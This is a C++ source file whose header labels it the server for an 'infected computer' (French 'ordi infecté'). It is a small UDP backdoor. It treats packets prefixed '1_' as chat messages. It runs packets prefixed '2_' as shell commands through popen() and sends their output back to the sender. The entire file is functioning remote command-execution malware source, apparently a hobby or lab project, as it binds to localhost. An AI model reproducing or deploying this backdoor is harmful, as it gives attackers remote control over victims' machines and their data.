/*
 * C++
 * main.cc
 *
 * 15 Juillet 2016
 *
 * Server (ordi infecté)
 *
 */
/* C++ headers */
#include <iostream>
#include <string>
/* C headers */
#include <stdio.h>
#include <assert.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
/* Defines */
#define BUF_SIZE 1024
/* Internal headers */

int main( int argc, char** argv )
{
    if( argc != 2 ) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(1);
    }
    int udpSocket, nBytes;
    char bufferRequest[BUF_SIZE];
    char bufferAnswer[BUF_SIZE];
    struct sockaddr_in serverAddr/*, clientAddr*/;
    struct sockaddr_storage serverStorage;
    socklen_t addr_size;
    int portNum = atoi(argv[1]);

    /* Create UDP socket */
    udpSocket = socket(PF_INET, SOCK_DGRAM, 0);

    /* Configure settings in address struct */
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);

    /* Bind socket with address struct */
    bind( udpSocket, (struct sockaddr *) &serverAddr, sizeof(serverAddr) );

    /* Initialize size variable to be used later on */
    addr_size = sizeof serverStorage;
    memset( bufferRequest, '\0', BUF_SIZE );

    while( 1 )
    {
        printf("Waiting for data...\n");
        fflush(stdout);
        /* Try to receive any incoming UDP datagram. Address and port of
          requesting client will be stored on serverStorage variable */
        nBytes = recvfrom( udpSocket, bufferRequest, BUF_SIZE, 0, (struct sockaddr *) &serverStorage, &addr_size );
        assert( nBytes != -1 );
        // printf("Received packet from %s:%d (%d bytes)\n", inet_ntoa(serverAddr.sin_addr), ntohs(serverAddr.sin_port), nBytes);

        int type = 0;
        if( bufferRequest[0] == '1' && bufferRequest[1] == '_' ) {
            memmove(bufferRequest, bufferRequest+2, strlen(bufferRequest));
            type = 1;
        }
        else if( bufferRequest[0] == '2' && bufferRequest[1] == '_' ) {
            memmove(bufferRequest, bufferRequest+2, strlen(bufferRequest));
            type = 2;
        }

        printf("[type:%s] Data: %s \n", (type==0)?"Unknown":((type==1)?"Message":"Command"), bufferRequest);

        if( type == 0 ) {
            printf("There is a problem. The received packet doesn't have (type=0).\n");
        }
        else if( type == 1 ) {
            printf("chat> %s\n", bufferRequest);
            /* Send to client, using serverStorage as the address */
            sendto( udpSocket, "OK", 3, 0, (struct sockaddr *) &serverStorage, addr_size );
        }
        else if( type == 2 ) {
            FILE *fp;

            /* Open the command for reading. */
            fp = popen(bufferRequest, "r+");
            if (fp == NULL) {
                printf("Failed to run command\n" );
                exit(1);
            }

            std::string output;
            /* Read the output a line at a time - output it. */
            while( fgets(bufferAnswer, BUF_SIZE, fp) != NULL ) {
                output.append( bufferAnswer );
            }
            const char *cstr = output.c_str();

            /* close */
            pclose(fp);

            puts(cstr);

            memset( bufferRequest, '\0', BUF_SIZE );
            memset( bufferAnswer, '\0', BUF_SIZE );

            /* Send to client, using serverStorage as the address */
            sendto( udpSocket, cstr, BUF_SIZE, 0, (struct sockaddr *) &serverStorage, addr_size );
        }
        else {
            printf("There is a problem. Can't understand the received packet (type=%d).\n", type);
        }
        
    }

    return 0;
}
